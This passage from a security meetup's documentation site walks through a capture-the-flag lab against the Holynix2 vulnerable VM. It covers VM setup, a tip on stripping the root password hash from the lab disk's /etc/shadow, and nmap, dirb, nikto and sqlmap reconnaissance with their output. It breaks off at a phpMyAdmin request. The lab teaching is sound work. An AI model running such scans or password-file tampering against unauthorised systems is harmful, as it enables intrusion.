

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.16. Holynix2 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.17. Holynix1" href="holynix1.html"/>
        <link rel="prev" title="3.15.9. XSS" href="security_shepherd_xss.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.16. Holynix2</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.16.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.16.1.1. Setting up the VMware VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.16.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#directory-setup">3.16.2.1. Directory setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#basic-network-reconnaisance">3.16.2.2. Basic network reconnaisance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#which-port-to-go-after-21-22-53-80">3.16.2.3. Which port to go after: 21, 22, 53, 80?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#comparing-the-ftp-users-to-etc-passwd-users">3.16.2.4. Comparing the FTP users to /etc/passwd users</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.16.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#the-plan">3.16.3.1. The plan</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cracking-the-ftp-password-hashes">3.16.3.2. Cracking the FTP password hashes</a></li>
<li class="toctree-l4"><a class="reference internal" href="#uploading-and-executing-the-php-reverse-shell">3.16.3.3. Uploading and executing the php reverse shell</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-to-root">3.16.3.4. Getting to root</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cleaning-up">3.16.3.5. Cleaning up</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#pentest-calisthenics-getting-the-user-list">3.16.4. Pentest Calisthenics - Getting the User List</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#user-list-from-the-dns-axfr">3.16.4.1. User list from the DNS axfr</a></li>
<li class="toctree-l4"><a class="reference internal" href="#could-we-brute-force-the-user-ids">3.16.4.2. Could we brute-force the user ids?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#what-s-on-the-user-s-ftp-web-page">3.16.4.3. What’s on the user’s FTP web page?</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.16. Holynix2</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/holynix2.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="holynix2">
<span id="id21"></span><h1>3.16. Holynix2<a class="headerlink" href="#holynix2" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.16.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/holynix-v2,21/">Vulnhub Holynix: v2</a>:</p>
<blockquote>
<div>Holynix2 is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information.</div></blockquote>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.16.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/holynix/holynix-v2.tar.bz2">holynix-v2.tar.bz2</a>, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to holynix2 via root.</p>
<p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Holynix2 is Ubuntu 8.04, x86, and 512MB memory. The network interface worked when set to “model=rtl8139” and the MAC address to 00:0C:29:13:21:B3, resulting in the IP hard-coded to 192.168.1.88. Here’s how you can create a backing store to undo any changes to the disk:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>holynix2
<span class="nv">BACKING</span><span class="o">=</span><span class="nv">$VM</span>.vmdk
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
curl --remote-name http://download.vulnhub.com/holynix/holynix-v2.tar.bz2
tar xvfj holynix-v2.tar.bz2
<span class="nb">cd</span> holynix2
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the holynix2 VM. The actual command the author used in Debian Linux to create the VM was:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>holynix2
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --network<span class="o">=</span><span class="s2">&quot;bridge=br0,mac=00:0C:29:13:21:B3,model=rtl8139&quot;</span> <span class="se">\</span>
    --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuhardy <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1">#    --console pty,target_type=virtio \</span>
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>So if holynix2 were running and you wanted to “start over again”:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuhardy <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.16.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="directory-setup">
<h3>3.16.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
<p>We’ll refer to the following directories below:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
<span class="nv">PT</span><span class="o">=</span><span class="nv">$BASE</span>/holynix2
<span class="nv">TOOLS</span><span class="o">=</span>dns,exploit,files,nmap,passwords,spider,sqlmap
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
</pre></div>
</div>
</div>
<div class="section" id="basic-network-reconnaisance">
<h3>3.16.2.2. Basic network reconnaisance<a class="headerlink" href="#basic-network-reconnaisance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaisance looking for the vulnerable host:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
<span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="nv">$SUDO</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
<span class="gp">hacker@kali:~$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="gp">hacker@kali:~$ cd $</span>JOB/nmap
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$</span> <span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$</span> <span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$</span> <span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="gp">  #</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap scan report for 192.168.1.88</span>
<span class="go">Host is up (0.00053s latency).</span>
<span class="go">MAC Address: 00:0C:29:13:21:B3 (VMware)</span>
<span class="gp">  #</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ #</span> use the grep-able output to get a list of target hosts
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$</span> grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ #</span> use the xml output to get an html report
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>At this point we have $TARGETS so scan them:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Discovered open port 80/tcp on 192.168.1.88</span>
</span><span class="go">Discovered open port 21/tcp on 192.168.1.88</span>
<span class="hll"><span class="go">Discovered open port 53/tcp on 192.168.1.88</span>
</span><span class="go">Discovered open port 22/tcp on 192.168.1.88</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">PORT   STATE  SERVICE  VERSION</span>
</span><span class="go">20/tcp closed ftp-data</span>
<span class="go">21/tcp open   ftp      Pure-FTPd</span>
<span class="go">|_ftp-anon: ERROR: Script execution failed (use -d to debug)</span>
<span class="go">|_ftp-bounce: no banner</span>
<span class="go">22/tcp open   ssh      OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span>
<span class="go">|_ssh-hostkey:</span>
<span class="hll"><span class="go">53/tcp open   domain   ISC BIND 9.4.2-P2.1</span>
</span><span class="go">| dns-nsid:</span>
<span class="go">|_  bind.version: 9.4.2-P2.1</span>
<span class="hll"><span class="go">80/tcp open   http     Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)</span>
</span><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: ZincFTP</span>
<span class="go">MAC Address: 00:0C:29:13:21:B3 (VMware)</span>
<span class="go">Device type: WAP</span>
<span class="go">Running: Linux 2.6.X</span>
<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
<span class="go">OS details: Tomato firmware (Linux 2.6.22)</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
<span class="gp">hacker@kali:~/pentest/holynix2/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Our target holynix2 is T=192.168.1.88 and runs the following services:</p>
<ul>
<li><p class="first">port 21:</p>
<p>Pure-FTPd</p>
</li>
<li><p class="first">port 22:</p>
<p>OpenSSH 4.7p1 Debian8ubuntu1.2</p>
</li>
<li><p class="first">port 53:</p>
<p>ISC BIND version 9.4.2-P2.1</p>
</li>
<li><p class="first">port 80:</p>
<p>Apache 2.2.8, Ubuntu PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch</p>
</li>
</ul>
<p><a class="reference external" href="https://launchpad.net/ubuntu/hardy/i386/php5/5.2.4-2ubuntu5.12">php5 5.2.4-2ubuntu5.12 (i386 binary) in ubuntu hardy</a> and <a class="reference external" href="https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1.2">openssh 1:4.7p1-8ubuntu1.2 source package in Ubuntu</a> point to Ubuntu Hardy (8.04).</p>
</div>
<div class="section" id="which-port-to-go-after-21-22-53-80">
<h3>3.16.2.3. Which port to go after: 21, 22, 53, 80?<a class="headerlink" href="#which-port-to-go-after-21-22-53-80" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ports-21-22-a-userid-password-guessing-game">
<h4>3.16.2.3.1. Ports 21, 22 a userid/password guessing game<a class="headerlink" href="#ports-21-22-a-userid-password-guessing-game" title="Permalink to this headline">¶</a></h4>
<p>A quick look-see at the ftp server showed anonymous authentication was not allowed and appeared to be an immediate dead-end. Similarily, ssh server was a guessing game for userid/passwords. The web server was investigated next.</p>
</div>
<div class="section" id="reconnaisance-on-port-80">
<h4>3.16.2.3.2. Reconnaisance on port 80<a class="headerlink" href="#reconnaisance-on-port-80" title="Permalink to this headline">¶</a></h4>
<div class="section" id="dirb">
<h5>3.16.2.3.2.1. dirb<a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h5>
<p>First scan the web server with <strong class="program">dirb</strong>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
dirb  http://<span class="nv">$T</span>/ -o dirb.txt
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat dirb.txt

<span class="go">-----------------</span>
<span class="go">DIRB v2.21</span>
<span class="go">By The Dark Raver</span>
<span class="go">-----------------</span>

<span class="go">OUTPUT_FILE: dirb.txt</span>
<span class="go">START_TIME: Thu Jun  4 15:02:30 2015</span>
<span class="go">URL_BASE: http://192.168.1.88/</span>
<span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span>

<span class="go">-----------------</span>

<span class="go">GENERATED WORDS: 4592</span>

<span class="go">---- Scanning URL: http://192.168.1.88/ ----</span>
<span class="go">+ http://192.168.1.88/index (CODE:200|SIZE:1205)</span>
<span class="go">+ http://192.168.1.88/index.php (CODE:200|SIZE:1205)</span>
<span class="go">+ http://192.168.1.88/phpMyAdmin (CODE:403|SIZE:330)</span>
<span class="go">+ http://192.168.1.88/register (CODE:200|SIZE:16)</span>
<span class="go">+ http://192.168.1.88/server-status (CODE:403|SIZE:333)</span>

<span class="go">-----------------</span>
<span class="go">DOWNLOADED: 4592 - FOUND: 5</span>
</pre></div>
</div>
</div>
<div class="section" id="nikto">
<h5>3.16.2.3.2.2. nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h5>
<p>Next up was a <strong class="program">nikto</strong> scan:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
nikto -output nikto_80.txt -host <span class="nv">$T</span>
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> cat nikto_80.txt
<span class="go">- Nikto v2.1.6/2.1.5</span>
<span class="go">+ Target Host: 192.168.1.88</span>
<span class="go">+ Target Port: 80</span>
<span class="go">+ GET Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12</span>
<span class="go">+ GET The anti-clickjacking X-Frame-Options header is not present.</span>
<span class="go">+ GET Uncommon header &#39;tcn&#39; found, with contents: list</span>
<span class="go">+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span>
<span class="go">+ HEAD PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.4.26)</span>
<span class="go">+ HEAD Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ VYYBKHFF Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
<span class="go">+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ OSVDB-12184: GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: GET /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: GET /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-3092: GET /register/: This might be interesting...</span>
<span class="go">+ OSVDB-3268: GET /icons/: Directory indexing found.</span>
<span class="go">+ GET Server leaks inodes via ETags, header found with file /icons/README, inode: 40753, size: 5108, mtime: Tue Aug 28 03:48:10 2007</span>
<span class="go">+ OSVDB-3233: GET /icons/README: Apache default file found.</span>
</pre></div>
</div>
</div>
<div class="section" id="port-80-analysis">
<h5>3.16.2.3.2.3. Port 80 analysis<a class="headerlink" href="#port-80-analysis" title="Permalink to this headline">¶</a></h5>
<p>Looking at the website, there was:</p>
<ul class="simple">
<li>A registration form.</li>
<li>phpMyAdmin MySQL administration.</li>
<li>The home page indicated users had web directories based on their name.</li>
</ul>
<p>Taking each of these in turn, we start with the registration form. Running the following <strong class="program">sqlmap</strong> query showed no injection vulnerability.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
<span class="nv">URL</span><span class="o">=</span>http://<span class="nv">$T</span>/
sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
  --output-dir <span class="nv">$PWD</span>/sqlmap_login --dbs
</pre></div>
</div>
<p>Trying the phpMyAdmin page resulted in a flat rejection (403) without any redirection to a login page. Either a secret login page or access by something other than userid/password alone.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/sqlmap$ cd $</span>PT/spider
<span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> curl -v http://<span class="nv">$T</span>/phpMyAdmin
